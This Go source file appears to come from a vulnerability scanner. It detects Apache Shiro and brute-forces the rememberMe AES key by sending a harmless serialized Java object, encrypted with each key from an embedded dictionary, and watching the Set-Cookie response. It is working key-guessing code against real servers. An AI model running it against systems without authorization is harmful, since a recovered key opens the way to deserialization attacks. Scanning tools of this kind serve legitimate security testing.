package gopocs

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"dddd/ddout"
	"dddd/structs"
	_ "embed"
	"encoding/base64"
	"fmt"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/retryablehttp-go"
	uuid "github.com/satori/go.uuid"
	"io"
	"math/big"
	"strings"
)

var CheckContent = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="

//go:embed dict/shirokeys.txt
var ShiroKeys string

func Randcase(len int) string {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

func sendShiroRequest(url string, data string) bool {
	req, err := retryablehttp.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Cookie", "JSESSIONID="+Randcase(8)+";rememberMe="+data)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}

	defer resp.Body.Close()
	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}

	return !strings.Contains(SetCookieAll, "rememberMe=deleteMe;")
}

func checkShiro(url string) bool {
	return sendShiroRequest(url, "123")
}

func Padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func AESCBCEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	Content = Padding(Content, block.BlockSize())
	iv := uuid.NewV4().Bytes()
	blockMode := cipher.NewCBCEncrypter(block, iv)
	cipherText := make([]byte, len(Content))
	blockMode.CryptBlocks(cipherText, Content)
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...)), nil
}

func AESGCMEncrypt(key []byte, Content []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, 16)
	io.ReadFull(rand.Reader, nonce)
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
}

func checkKey(url string, shiroKey string, content []byte) (bool, string) {
	keyDecrypt, _ := base64.StdEncoding.DecodeString(shiroKey)

	RememberMe, err := AESCBCEncrypt(keyDecrypt, content)
	if err != nil {
		return false, ""
	}
	ok := sendShiroRequest(url, RememberMe)
	if ok {
		// 确认一次，减少误报
		if sendShiroRequest(url, RememberMe) {
			return true, "cbc"
		}
	}

	RememberMe, err = AESGCMEncrypt(keyDecrypt, content)
	ok = sendShiroRequest(url, RememberMe)
	if err != nil {
		return false, ""
	}
	if ok {
		// 确认一次，减少误报
		if sendShiroRequest(url, RememberMe) {
			return true, "gcm"
		}
	}

	return false, ""

}

func ShiroKeyCheck(info *structs.HostInfo) {
	url := info.Url

	// 不是shiro目标
	gologger.AuditTimeLogger("[Go] [Shiro] detect shiro %v", url)
	if checkShiro(url) {
		return
	}

	content, _ := base64.StdEncoding.DecodeString(CheckContent)
	t := strings.ReplaceAll(ShiroKeys, "\r\n", "\n")
	ks := strings.Split(t, "\n")
	for _, key := range ks {
		gologger.AuditTimeLogger("[Go] [Shiro] try %v key: %v", url, key)
		ok, tp := checkKey(url, key, content)
		if ok && tp != "" {
			// gologger.Silent().Msgf("%v [%v] [%v]", url, key, tp)

			showData := fmt.Sprintf("Host: %v\nkey: %v\nmode: %v\n", url, key, tp)

			ddout.FormatOutput(ddout.OutputMessage{
				Type:     "GoPoc",
				IP:       "",
				IPs:      nil,
				Port:     "",
				Protocol: "",
				Web:      ddout.WebInfo{},
				Finger:   nil,
				Domain:   "",
				GoPoc: ddout.GoPocsResultType{PocName: "Shiro Weak Key",
					Security:    "CRITICAL",
					Target:      url,
					InfoLeft:    showData,
					InfoRight:   "",
					Description: "shiro Key",
					ShowMsg:     fmt.Sprintf("%v [%v] [%v]", url, key, tp)},
				AdditionalMsg: "",
			})

			GoPocWriteResult(structs.GoPocsResultType{
				PocName:     "Shiro Weak Key",
				Security:    "CRITICAL",
				Target:      url,
				InfoLeft:    showData,
				InfoRight:   "",
				Description: "shiro Key",
			})
			break
		}
	}
	gologger.AuditTimeLogger("[Go] [Shiro] ShiroKeyCheck return! %v", url)

}
